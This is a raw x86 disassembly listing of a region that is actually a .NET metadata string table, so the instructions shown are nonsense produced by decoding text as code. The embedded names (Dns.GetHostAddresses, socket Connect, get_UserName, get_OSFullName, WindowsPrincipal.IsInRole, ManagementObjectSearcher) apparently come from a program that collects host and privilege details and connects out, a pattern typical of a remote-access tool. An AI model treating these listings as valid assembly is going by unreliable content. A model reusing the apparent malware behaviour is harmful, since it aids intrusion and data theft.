  407016:	4d                   	dec    %ebp
  407017:	79 47                	jns    0x407060
  407019:	72 6f                	jb     0x40708a
  40701b:	75 70                	jne    0x40708d
  40701d:	43                   	inc    %ebx
  40701e:	6f                   	outsl  %ds:(%esi),(%dx)
  40701f:	6c                   	insb   (%dx),%es:(%edi)
  407020:	6c                   	insb   (%dx),%es:(%edi)
  407021:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407026:	6e                   	outsb  %ds:(%esi),(%dx)
  407027:	41                   	inc    %ecx
  407028:	74 74                	je     0x40709e
  40702a:	72 69                	jb     0x407095
  40702c:	62 75 74             	bound  %esi,0x74(%ebp)
  40702f:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  407033:	73 74                	jae    0x4070a9
  407035:	65 6d                	gs insl (%dx),%es:(%edi)
  407037:	2e 52                	cs push %edx
  407039:	75 6e                	jne    0x4070a9
  40703b:	74 69                	je     0x4070a6
  40703d:	6d                   	insl   (%dx),%es:(%edi)
  40703e:	65 2e 49             	gs cs dec %ecx
  407041:	6e                   	outsb  %ds:(%esi),(%dx)
  407042:	74 65                	je     0x4070a9
  407044:	72 6f                	jb     0x4070b5
  407046:	70 53                	jo     0x40709b
  407048:	65 72 76             	gs jb  0x4070c1
  40704b:	69 63 65 73 00 43 6f 	imul   $0x6f430073,0x65(%ebx),%esp
  407052:	6d                   	insl   (%dx),%es:(%edi)
  407053:	56                   	push   %esi
  407054:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  40705b:	74 74                	je     0x4070d1
  40705d:	72 69                	jb     0x4070c8
  40705f:	62 75 74             	bound  %esi,0x74(%ebp)
  407062:	65 00 54 68 72       	add    %dl,%gs:0x72(%eax,%ebp,2)
  407067:	65 61                	gs popa
  407069:	64 53                	fs push %ebx
  40706b:	74 61                	je     0x4070ce
  40706d:	74 69                	je     0x4070d8
  40706f:	63 41 74             	arpl   %eax,0x74(%ecx)
  407072:	74 72                	je     0x4070e6
  407074:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  40707b:	6f                   	outsl  %ds:(%esi),(%dx)
  40707c:	6d                   	insl   (%dx),%es:(%edi)
  40707d:	70 69                	jo     0x4070e8
  40707f:	6c                   	insb   (%dx),%es:(%edi)
  407080:	65 72 47             	gs jb  0x4070ca
  407083:	65 6e                	outsb  %gs:(%esi),(%dx)
  407085:	65 72 61             	gs jb  0x4070e9
  407088:	74 65                	je     0x4070ef
  40708a:	64 41                	fs inc %ecx
  40708c:	74 74                	je     0x407102
  40708e:	72 69                	jb     0x4070f9
  407090:	62 75 74             	bound  %esi,0x74(%ebp)
  407093:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  407097:	6e                   	outsb  %ds:(%esi),(%dx)
  407098:	76 65                	jbe    0x4070ff
  40709a:	72 73                	jb     0x40710f
  40709c:	69 6f 6e 73 00 54 6f 	imul   $0x6f540073,0x6e(%edi),%ebp
  4070a3:	49                   	dec    %ecx
  4070a4:	6e                   	outsb  %ds:(%esi),(%dx)
  4070a5:	74 65                	je     0x40710c
  4070a7:	67 65 72 00          	addr16 gs jb 0x4070ab
  4070ab:	56                   	push   %esi
  4070ac:	42                   	inc    %edx
  4070ad:	24 41                	and    $0x41,%al
  4070af:	6e                   	outsb  %ds:(%esi),(%dx)
  4070b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4070b1:	6e                   	outsb  %ds:(%esi),(%dx)
  4070b2:	79 6d                	jns    0x407121
  4070b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4070b5:	75 73                	jne    0x40712a
  4070b7:	44                   	inc    %esp
  4070b8:	65 6c                	gs insb (%dx),%es:(%edi)
  4070ba:	65 67 61             	gs addr16 popa
  4070bd:	74 65                	je     0x407124
  4070bf:	5f                   	pop    %edi
  4070c0:	30 00                	xor    %al,(%eax)
  4070c2:	4d                   	dec    %ebp
  4070c3:	75 6c                	jne    0x407131
  4070c5:	74 69                	je     0x407130
  4070c7:	63 61 73             	arpl   %esp,0x73(%ecx)
  4070ca:	74 44                	je     0x407110
  4070cc:	65 6c                	gs insb (%dx),%es:(%edi)
  4070ce:	65 67 61             	gs addr16 popa
  4070d1:	74 65                	je     0x407138
  4070d3:	00 54 61 72          	add    %dl,0x72(%ecx,%eiz,2)
  4070d7:	67 65 74 4f          	addr16 gs je 0x40712a
  4070db:	62 6a 65             	bound  %ebp,0x65(%edx)
  4070de:	63 74 00 54          	arpl   %esi,0x54(%eax,%eax,1)
  4070e2:	61                   	popa
  4070e3:	72 67                	jb     0x40714c
  4070e5:	65 74 4d             	gs je  0x407135
  4070e8:	65 74 68             	gs je  0x407153
  4070eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4070ec:	64 00 41 73          	add    %al,%fs:0x73(%ecx)
  4070f0:	79 6e                	jns    0x407160
  4070f2:	63 43 61             	arpl   %eax,0x61(%ebx)
  4070f5:	6c                   	insb   (%dx),%es:(%edi)
  4070f6:	6c                   	insb   (%dx),%es:(%edi)
  4070f7:	62 61 63             	bound  %esp,0x63(%ecx)
  4070fa:	6b 00 42             	imul   $0x42,(%eax),%eax
  4070fd:	65 67 69 6e 49 6e 76 	imul   $0x6b6f766e,%gs:0x49(%bp),%ebp
  407104:	6f 6b 
  407106:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  40710b:	65 67 61             	gs addr16 popa
  40710e:	74 65                	je     0x407175
  407110:	43                   	inc    %ebx
  407111:	61                   	popa
  407112:	6c                   	insb   (%dx),%es:(%edi)
  407113:	6c                   	insb   (%dx),%es:(%edi)
  407114:	62 61 63             	bound  %esp,0x63(%ecx)
  407117:	6b 00 44             	imul   $0x44,(%eax),%eax
  40711a:	65 6c                	gs insb (%dx),%es:(%edi)
  40711c:	65 67 61             	gs addr16 popa
  40711f:	74 65                	je     0x407186
  407121:	41                   	inc    %ecx
  407122:	73 79                	jae    0x40719d
  407124:	6e                   	outsb  %ds:(%esi),(%dx)
  407125:	63 53 74             	arpl   %edx,0x74(%ebx)
  407128:	61                   	popa
  407129:	74 65                	je     0x407190
  40712b:	00 45 6e             	add    %al,0x6e(%ebp)
  40712e:	64 49                	fs dec %ecx
  407130:	6e                   	outsb  %ds:(%esi),(%dx)
  407131:	76 6f                	jbe    0x4071a2
  407133:	6b 65 00 44          	imul   $0x44,0x0(%ebp),%esp
  407137:	65 6c                	gs insb (%dx),%es:(%edi)
  407139:	65 67 61             	gs addr16 popa
  40713c:	74 65                	je     0x4071a3
  40713e:	41                   	inc    %ecx
  40713f:	73 79                	jae    0x4071ba
  407141:	6e                   	outsb  %ds:(%esi),(%dx)
  407142:	63 52 65             	arpl   %edx,0x65(%edx)
  407145:	73 75                	jae    0x4071bc
  407147:	6c                   	insb   (%dx),%es:(%edi)
  407148:	74 00                	je     0x40714a
  40714a:	49                   	dec    %ecx
  40714b:	6e                   	outsb  %ds:(%esi),(%dx)
  40714c:	76 6f                	jbe    0x4071bd
  40714e:	6b 65 00 5f          	imul   $0x5f,0x0(%ebp),%esp
  407152:	4c                   	dec    %esp
  407153:	61                   	popa
  407154:	6d                   	insl   (%dx),%es:(%edi)
  407155:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  407159:	5f                   	pop    %edi
  40715a:	5f                   	pop    %edi
  40715b:	31 00                	xor    %eax,(%eax)
  40715d:	5f                   	pop    %edi
  40715e:	4c                   	dec    %esp
  40715f:	61                   	popa
  407160:	6d                   	insl   (%dx),%es:(%edi)
  407161:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  407165:	5f                   	pop    %edi
  407166:	5f                   	pop    %edi
  407167:	32 00                	xor    (%eax),%al
  407169:	44                   	inc    %esp
  40716a:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40716e:	67 65 72 44          	addr16 gs jb 0x4071b6
  407172:	69 73 70 6c 61 79 41 	imul   $0x4179616c,0x70(%ebx),%esi
  407179:	74 74                	je     0x4071ef
  40717b:	72 69                	jb     0x4071e6
  40717d:	62 75 74             	bound  %esi,0x74(%ebp)
  407180:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  407185:	75 67                	jne    0x4071ee
  407187:	67 65 72 53          	addr16 gs jb 0x4071de
  40718b:	74 65                	je     0x4071f2
  40718d:	70 54                	jo     0x4071e3
  40718f:	68 72 6f 75 67       	push   $0x67756f72
  407194:	68 41 74 74 72       	push   $0x72747441
  407199:	69 62 75 74 65 00 45 	imul   $0x45006574,0x75(%edx),%esp
  4071a0:	78 63                	js     0x407205
  4071a2:	65 70 74             	gs jo  0x407219
  4071a5:	69 6f 6e 00 50 72 6f 	imul   $0x6f725000,0x6e(%edi),%ebp
  4071ac:	6a 65                	push   $0x65
  4071ae:	63 74 44 61          	arpl   %esi,0x61(%esp,%eax,2)
  4071b2:	74 61                	je     0x407215
  4071b4:	00 53 65             	add    %dl,0x65(%ebx)
  4071b7:	74 50                	je     0x407209
  4071b9:	72 6f                	jb     0x40722a
  4071bb:	6a 65                	push   $0x65
  4071bd:	63 74 45 72          	arpl   %esi,0x72(%ebp,%eax,2)
  4071c1:	72 6f                	jb     0x407232
  4071c3:	72 00                	jb     0x4071c5
  4071c5:	45                   	inc    %ebp
  4071c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4071c7:	76 69                	jbe    0x407232
  4071c9:	72 6f                	jb     0x40723a
  4071cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4071cc:	6d                   	insl   (%dx),%es:(%edi)
  4071cd:	65 6e                	outsb  %gs:(%esi),(%dx)
  4071cf:	74 00                	je     0x4071d1
  4071d1:	45                   	inc    %ebp
  4071d2:	78 69                	js     0x40723d
  4071d4:	74 00                	je     0x4071d6
  4071d6:	43                   	inc    %ebx
  4071d7:	6c                   	insb   (%dx),%es:(%edi)
  4071d8:	65 61                	gs popa
  4071da:	72 50                	jb     0x40722c
  4071dc:	72 6f                	jb     0x40724d
  4071de:	6a 65                	push   $0x65
  4071e0:	63 74 45 72          	arpl   %esi,0x72(%ebp,%eax,2)
  4071e4:	72 6f                	jb     0x407255
  4071e6:	72 00                	jb     0x4071e8
  4071e8:	54                   	push   %esp
  4071e9:	68 72 65 61 64       	push   $0x64616572
  4071ee:	53                   	push   %ebx
  4071ef:	74 61                	je     0x407252
  4071f1:	72 74                	jb     0x407267
  4071f3:	00 53 74             	add    %dl,0x74(%ebx)
  4071f6:	61                   	popa
  4071f7:	72 74                	jb     0x40726d
  4071f9:	00 4a 6f             	add    %cl,0x6f(%edx)
  4071fc:	69 6e 00 4e 65 78 74 	imul   $0x7478654e,0x0(%esi),%ebp
  407203:	00 57 61             	add    %dl,0x61(%edi)
  407206:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  40720d:	65 
  40720e:	00 57 61             	add    %dl,0x61(%edi)
  407211:	69 74 4f 6e 65 00 53 	imul   $0x54530065,0x6e(%edi,%ecx,2),%esi
  407218:	54 
  407219:	41                   	inc    %ecx
  40721a:	54                   	push   %esp
  40721b:	68 72 65 61 64       	push   $0x64616572
  407220:	41                   	inc    %ecx
  407221:	74 74                	je     0x407297
  407223:	72 69                	jb     0x40728e
  407225:	62 75 74             	bound  %esi,0x74(%ebp)
  407228:	65 00 5f 4c          	add    %bl,%gs:0x4c(%edi)
  40722c:	61                   	popa
  40722d:	6d                   	insl   (%dx),%es:(%edi)
  40722e:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  407232:	5f                   	pop    %edi
  407233:	5f                   	pop    %edi
  407234:	33 00                	xor    (%eax),%eax
  407236:	61                   	popa
  407237:	30 00                	xor    %al,(%eax)
  407239:	5f                   	pop    %edi
  40723a:	4c                   	dec    %esp
  40723b:	61                   	popa
  40723c:	6d                   	insl   (%dx),%es:(%edi)
  40723d:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  407241:	5f                   	pop    %edi
  407242:	5f                   	pop    %edi
  407243:	34 00                	xor    $0x0,%al
  407245:	53                   	push   %ebx
  407246:	79 73                	jns    0x4072bb
  407248:	74 65                	je     0x4072af
  40724a:	6d                   	insl   (%dx),%es:(%edi)
  40724b:	2e 4e                	cs dec %esi
  40724d:	65 74 00             	gs je  0x407250
  407250:	49                   	dec    %ecx
  407251:	50                   	push   %eax
  407252:	41                   	inc    %ecx
  407253:	64 64 72 65          	fs fs jb 0x4072bc
  407257:	73 73                	jae    0x4072cc
  407259:	00 43 68             	add    %al,0x68(%ebx)
  40725c:	61                   	popa
  40725d:	72 00                	jb     0x40725f
  40725f:	53                   	push   %ebx
  407260:	74 72                	je     0x4072d4
  407262:	69 6e 67 00 53 70 6c 	imul   $0x6c705300,0x67(%esi),%ebp
  407269:	69 74 00 44 6e 73 00 	imul   $0x4700736e,0x44(%eax,%eax,1),%esi
  407270:	47 
  407271:	65 74 48             	gs je  0x4072bc
  407274:	6f                   	outsl  %ds:(%esi),(%dx)
  407275:	73 74                	jae    0x4072eb
  407277:	41                   	inc    %ecx
  407278:	64 64 72 65          	fs fs jb 0x4072e1
  40727c:	73 73                	jae    0x4072f1
  40727e:	65 73 00             	gs jae 0x407281
  407281:	54                   	push   %esp
  407282:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  407289:	6c                   	insb   (%dx),%es:(%edi)
  40728a:	62 61 63             	bound  %esp,0x63(%ecx)
  40728d:	6b 00 41             	imul   $0x41,(%eax),%eax
  407290:	64 64 72 65          	fs fs jb 0x4072f9
  407294:	73 73                	jae    0x407309
  407296:	46                   	inc    %esi
  407297:	61                   	popa
  407298:	6d                   	insl   (%dx),%es:(%edi)
  407299:	69 6c 79 00 53 6f 63 	imul   $0x6b636f53,0x0(%ecx,%edi,2),%ebp
  4072a0:	6b 
  4072a1:	65 74 54             	gs je  0x4072f8
  4072a4:	79 70                	jns    0x407316
  4072a6:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  4072aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4072ab:	74 6f                	je     0x40731c
  4072ad:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  4072b0:	54                   	push   %esp
  4072b1:	79 70                	jns    0x407323
  4072b3:	65 00 42 79          	add    %al,%gs:0x79(%edx)
  4072b7:	74 65                	je     0x40731e
  4072b9:	00 73 65             	add    %dh,0x65(%ebx)
  4072bc:	74 5f                	je     0x40731d
  4072be:	52                   	push   %edx
  4072bf:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  4072c3:	76 65                	jbe    0x40732a
  4072c5:	42                   	inc    %edx
  4072c6:	75 66                	jne    0x40732e
  4072c8:	66 65 72 53          	data16 gs jb 0x40731f
  4072cc:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  4072d3:	5f                   	pop    %edi
  4072d4:	53                   	push   %ebx
  4072d5:	65 6e                	outsb  %gs:(%esi),(%dx)
  4072d7:	64 42                	fs inc %edx
  4072d9:	75 66                	jne    0x407341
  4072db:	66 65 72 53          	data16 gs jb 0x407332
  4072df:	69 7a 65 00 43 6f 6e 	imul   $0x6e6f4300,0x65(%edx),%edi
  4072e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4072e7:	65 63 74 00 53       	arpl   %esi,%gs:0x53(%eax,%eax,1)
  4072ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4072ed:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4072f0:	74 46                	je     0x407338
  4072f2:	6c                   	insb   (%dx),%es:(%edi)
  4072f3:	61                   	popa
  4072f4:	67 73 00             	addr16 jae 0x4072f7
  4072f7:	45                   	inc    %ebp
  4072f8:	76 65                	jbe    0x40735f
  4072fa:	6e                   	outsb  %ds:(%esi),(%dx)
  4072fb:	74 57                	je     0x407354
  4072fd:	61                   	popa
  4072fe:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  407305:	65 
  407306:	00 53 65             	add    %dl,0x65(%ebx)
  407309:	74 00                	je     0x40730b
  40730b:	43                   	inc    %ebx
  40730c:	6f                   	outsl  %ds:(%esi),(%dx)
  40730d:	6d                   	insl   (%dx),%es:(%edi)
  40730e:	70 75                	jo     0x407385
  407310:	74 65                	je     0x407377
  407312:	72 49                	jb     0x40735d
  407314:	6e                   	outsb  %ds:(%esi),(%dx)
  407315:	66 6f                	outsw  %ds:(%esi),(%dx)
  407317:	00 67 65             	add    %ah,0x65(%edi)
  40731a:	74 5f                	je     0x40737b
  40731c:	55                   	push   %ebp
  40731d:	73 65                	jae    0x407384
  40731f:	72 4e                	jb     0x40736f
  407321:	61                   	popa
  407322:	6d                   	insl   (%dx),%es:(%edi)
  407323:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407327:	74 5f                	je     0x407388
  407329:	4f                   	dec    %edi
  40732a:	53                   	push   %ebx
  40732b:	46                   	inc    %esi
  40732c:	75 6c                	jne    0x40739a
  40732e:	6c                   	insb   (%dx),%es:(%edi)
  40732f:	4e                   	dec    %esi
  407330:	61                   	popa
  407331:	6d                   	insl   (%dx),%es:(%edi)
  407332:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  407336:	70 6c                	jo     0x4073a4
  407338:	61                   	popa
  407339:	63 65 00             	arpl   %esp,0x0(%ebp)
  40733c:	4f                   	dec    %edi
  40733d:	70 65                	jo     0x4073a4
  40733f:	72 61                	jb     0x4073a2
  407341:	74 69                	je     0x4073ac
  407343:	6e                   	outsb  %ds:(%esi),(%dx)
  407344:	67 53                	addr16 push %ebx
  407346:	79 73                	jns    0x4073bb
  407348:	74 65                	je     0x4073af
  40734a:	6d                   	insl   (%dx),%es:(%edi)
  40734b:	00 67 65             	add    %ah,0x65(%edi)
  40734e:	74 5f                	je     0x4073af
  407350:	4f                   	dec    %edi
  407351:	53                   	push   %ebx
  407352:	56                   	push   %esi
  407353:	65 72 73             	gs jb  0x4073c9
  407356:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  40735d:	5f                   	pop    %edi
  40735e:	53                   	push   %ebx
  40735f:	65 72 76             	gs jb  0x4073d8
  407362:	69 63 65 50 61 63 6b 	imul   $0x6b636150,0x65(%ebx),%esp
  407369:	00 43 6f             	add    %al,0x6f(%ebx)
  40736c:	6e                   	outsb  %ds:(%esi),(%dx)
  40736d:	63 61 74             	arpl   %esp,0x74(%ecx)
  407370:	00 67 65             	add    %ah,0x65(%edi)
  407373:	74 5f                	je     0x4073d4
  407375:	49                   	dec    %ecx
  407376:	73 36                	jae    0x4073ae
  407378:	34 42                	xor    $0x42,%al
  40737a:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  407381:	74 
  407382:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  407389:	65 6d                	gs insl (%dx),%es:(%edi)
  40738b:	00 42 6f             	add    %al,0x6f(%edx)
  40738e:	6f                   	outsl  %ds:(%esi),(%dx)
  40738f:	6c                   	insb   (%dx),%es:(%edi)
  407390:	65 61                	gs popa
  407392:	6e                   	outsb  %ds:(%esi),(%dx)
  407393:	00 46 69             	add    %al,0x69(%esi)
  407396:	6c                   	insb   (%dx),%es:(%edi)
  407397:	65 49                	gs dec %ecx
  407399:	6e                   	outsb  %ds:(%esi),(%dx)
  40739a:	66 6f                	outsw  %ds:(%esi),(%dx)
  40739c:	00 44 61 74          	add    %al,0x74(%ecx,%eiz,2)
  4073a0:	65 54                	gs push %esp
  4073a2:	69 6d 65 00 46 69 6c 	imul   $0x6c694600,0x65(%ebp),%ebp
  4073a9:	65 53                	gs push %ebx
  4073ab:	79 73                	jns    0x407420
  4073ad:	74 65                	je     0x407414
  4073af:	6d                   	insl   (%dx),%es:(%edi)
  4073b0:	49                   	dec    %ecx
  4073b1:	6e                   	outsb  %ds:(%esi),(%dx)
  4073b2:	66 6f                	outsw  %ds:(%esi),(%dx)
  4073b4:	00 67 65             	add    %ah,0x65(%edi)
  4073b7:	74 5f                	je     0x407418
  4073b9:	4c                   	dec    %esp
  4073ba:	61                   	popa
  4073bb:	73 74                	jae    0x407431
  4073bd:	57                   	push   %edi
  4073be:	72 69                	jb     0x407429
  4073c0:	74 65                	je     0x407427
  4073c2:	54                   	push   %esp
  4073c3:	69 6d 65 00 50 61 74 	imul   $0x74615000,0x65(%ebp),%ebp
  4073ca:	68 00 47 65 74       	push   $0x74654700
  4073cf:	46                   	inc    %esi
  4073d0:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4073d7:	00 
  4073d8:	4f                   	dec    %edi
  4073d9:	70 65                	jo     0x407440
  4073db:	72 61                	jb     0x40743e
  4073dd:	74 6f                	je     0x40744e
  4073df:	72 73                	jb     0x407454
  4073e1:	00 43 6f             	add    %al,0x6f(%ebx)
  4073e4:	6d                   	insl   (%dx),%es:(%edi)
  4073e5:	70 61                	jo     0x407448
  4073e7:	72 65                	jb     0x40744e
  4073e9:	53                   	push   %ebx
  4073ea:	74 72                	je     0x40745e
  4073ec:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  4073f3:	74 65                	je     0x40745a
  4073f5:	6d                   	insl   (%dx),%es:(%edi)
  4073f6:	2e 53                	cs push %ebx
  4073f8:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4073fc:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  407403:	6e 
  407404:	63 69 70             	arpl   %ebp,0x70(%ecx)
  407407:	61                   	popa
  407408:	6c                   	insb   (%dx),%es:(%edi)
  407409:	00 57 69             	add    %dl,0x69(%edi)
  40740c:	6e                   	outsb  %ds:(%esi),(%dx)
  40740d:	64 6f                	outsl  %fs:(%esi),(%dx)
  40740f:	77 73                	ja     0x407484
  407411:	49                   	dec    %ecx
  407412:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  407415:	74 69                	je     0x407480
  407417:	74 79                	je     0x407492
  407419:	00 47 65             	add    %al,0x65(%edi)
  40741c:	74 43                	je     0x407461
  40741e:	75 72                	jne    0x407492
  407420:	72 65                	jb     0x407487
  407422:	6e                   	outsb  %ds:(%esi),(%dx)
  407423:	74 00                	je     0x407425
  407425:	57                   	push   %edi
  407426:	69 6e 64 6f 77 73 50 	imul   $0x5073776f,0x64(%esi),%ebp
  40742d:	72 69                	jb     0x407498
  40742f:	6e                   	outsb  %ds:(%esi),(%dx)
  407430:	63 69 70             	arpl   %ebp,0x70(%ecx)
  407433:	61                   	popa
  407434:	6c                   	insb   (%dx),%es:(%edi)
  407435:	00 57 69             	add    %dl,0x69(%edi)
  407438:	6e                   	outsb  %ds:(%esi),(%dx)
  407439:	64 6f                	outsl  %fs:(%esi),(%dx)
  40743b:	77 73                	ja     0x4074b0
  40743d:	42                   	inc    %edx
  40743e:	75 69                	jne    0x4074a9
  407440:	6c                   	insb   (%dx),%es:(%edi)
  407441:	74 49                	je     0x40748c
  407443:	6e                   	outsb  %ds:(%esi),(%dx)
  407444:	52                   	push   %edx
  407445:	6f                   	outsl  %ds:(%esi),(%dx)
  407446:	6c                   	insb   (%dx),%es:(%edi)
  407447:	65 00 49 73          	add    %cl,%gs:0x73(%ecx)
  40744b:	49                   	dec    %ecx
  40744c:	6e                   	outsb  %ds:(%esi),(%dx)
  40744d:	52                   	push   %edx
  40744e:	6f                   	outsl  %ds:(%esi),(%dx)
  40744f:	6c                   	insb   (%dx),%es:(%edi)
  407450:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  407454:	73 74                	jae    0x4074ca
  407456:	65 6d                	gs insl (%dx),%es:(%edi)
  407458:	2e 4d                	cs dec %ebp
  40745a:	61                   	popa
  40745b:	6e                   	outsb  %ds:(%esi),(%dx)
  40745c:	61                   	popa
  40745d:	67 65 6d             	gs insl (%dx),%es:(%di)
  407460:	65 6e                	outsb  %gs:(%esi),(%dx)
  407462:	74 00                	je     0x407464
  407464:	4d                   	dec    %ebp
  407465:	61                   	popa
  407466:	6e                   	outsb  %ds:(%esi),(%dx)
  407467:	61                   	popa
  407468:	67 65 6d             	gs insl (%dx),%es:(%di)
  40746b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40746d:	74 4f                	je     0x4074be
  40746f:	62 6a 65             	bound  %ebp,0x65(%edx)
  407472:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  407476:	61                   	popa
  407477:	72 63                	jb     0x4074dc
  407479:	68 65 72 00 4d       	push   $0x4d007265
  40747e:	61                   	popa
  40747f:	6e                   	outsb  %ds:(%esi),(%dx)
  407480:	61                   	popa
  407481:	67 65 6d             	gs insl (%dx),%es:(%di)
  407484:	65 6e                	outsb  %gs:(%esi),(%dx)
  407486:	74 42                	je     0x4074ca
  407488:	61                   	popa
  407489:	73 65                	jae    0x4074f0
  40748b:	4f                   	dec    %edi
  40748c:	62 6a 65             	bound  %ebp,0x65(%edx)
  40748f:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  407493:	61                   	popa
  407494:	6e                   	outsb  %ds:(%esi),(%dx)
  407495:	61                   	popa
  407496:	67 65 6d             	gs insl (%dx),%es:(%di)
  407499:	65 6e                	outsb  %gs:(%esi),(%dx)
  40749b:	74 4f                	je     0x4074ec
  40749d:	62 6a 65             	bound  %ebp,0x65(%edx)
  4074a0:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  4074a4:	6c                   	insb   (%dx),%es:(%edi)
  4074a5:	6c                   	insb   (%dx),%es:(%edi)
  4074a6:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4074ab:	6e                   	outsb  %ds:(%esi),(%dx)
  4074ac:	00 4d 61             	add    %cl,0x61(%ebp)
  4074af:	6e                   	outsb  %ds:(%esi),(%dx)
  4074b0:	61                   	popa
  4074b1:	67 65 6d             	gs insl (%dx),%es:(%di)
  4074b4:	65 6e                	outsb  %gs:(%esi),(%dx)
  4074b6:	74 4f                	je     0x407507
  4074b8:	62 6a 65             	bound  %ebp,0x65(%edx)
  4074bb:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  4074bf:	75 6d                	jne    0x40752e
  4074c1:	65 72 61             	gs jb  0x407525
  4074c4:	74 6f                	je     0x407535
  4074c6:	72 00                	jb     0x4074c8
  4074c8:	67 65 74 5f          	addr16 gs je 0x40752b
  4074cc:	4d                   	dec    %ebp
  4074cd:	61                   	popa
  4074ce:	63 68 69             	arpl   %ebp,0x69(%eax)
  4074d1:	6e                   	outsb  %ds:(%esi),(%dx)
  4074d2:	65 4e                	gs dec %esi
  4074d4:	61                   	popa
  4074d5:	6d                   	insl   (%dx),%es:(%edi)
  4074d6:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4074da:	74 00                	je     0x4074dc
  4074dc:	47                   	inc    %edi
  4074dd:	65 74 45             	gs je  0x407525
  4074e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4074e1:	75 6d                	jne    0x407550
  4074e3:	65 72 61             	gs jb  0x407547
  4074e6:	74 6f                	je     0x407557
  4074e8:	72 00                	jb     0x4074ea
  4074ea:	67 65 74 5f          	addr16 gs je 0x40754d
  4074ee:	43                   	inc    %ebx
  4074ef:	75 72                	jne    0x407563
  4074f1:	72 65                	jb     0x407558
  4074f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4074f4:	74 00                	je     0x4074f6
  4074f6:	67 65 74 5f          	addr16 gs je 0x407559
  4074fa:	49                   	dec    %ecx
  4074fb:	74 65                	je     0x407562
  4074fd:	6d                   	insl   (%dx),%es:(%edi)
  4074fe:	00 41 70             	add    %al,0x70(%ecx)
  407501:	70 65                	jo     0x407568
  407503:	6e                   	outsb  %ds:(%esi),(%dx)
  407504:	64 00 4d 6f          	add    %cl,%fs:0x6f(%ebp)
  407508:	76 65                	jbe    0x40756f
  40750a:	4e                   	dec    %esi
  40750b:	65 78 74             	gs js  0x407582
  40750e:	00 49 44             	add    %cl,0x44(%ecx)
  407511:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  407518:	6c                   	insb   (%dx),%es:(%edi)
  407519:	65 00 44 69 73       	add    %al,%gs:0x73(%ecx,%ebp,2)
  40751e:	70 6f                	jo     0x40758f
  407520:	73 65                	jae    0x407587
  407522:	00 67 65             	add    %ah,0x65(%edi)
  407525:	74 5f                	je     0x407586
  407527:	4c                   	dec    %esp
  407528:	65 6e                	outsb  %gs:(%esi),(%dx)
  40752a:	67 74 68             	addr16 je 0x407595
  40752d:	00 53 75             	add    %dl,0x75(%ebx)
  407530:	62 73 74             	bound  %esi,0x74(%ebx)
  407533:	72 69                	jb     0x40759e
  407535:	6e                   	outsb  %ds:(%esi),(%dx)
  407536:	67 00 4f 62          	add    %cl,0x62(%bx)
  40753a:	6a 65                	push   $0x65
  40753c:	63 74 51 75          	arpl   %esi,0x75(%ecx,%edx,2)
  407540:	65 72 79             	gs jb  0x4075bc
  407543:	00 4d 61             	add    %cl,0x61(%ebp)
  407546:	6e                   	outsb  %ds:(%esi),(%dx)
  407547:	61                   	popa
  407548:	67 65 6d             	gs insl (%dx),%es:(%di)
  40754b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40754d:	74 4f                	je     0x40759e
  40754f:	62 6a 65             	bound  %ebp,0x65(%edx)
  407552:	63 74 00 45          	arpl   %esi,0x45(%eax,%eax,1)
  407556:	6d                   	insl   (%dx),%es:(%edi)
  407557:	70 74                	jo     0x4075cd
  407559:	79 00                	jns    0x40755b
  40755b:	43                   	inc    %ebx
  40755c:	6f                   	outsl  %ds:(%esi),(%dx)
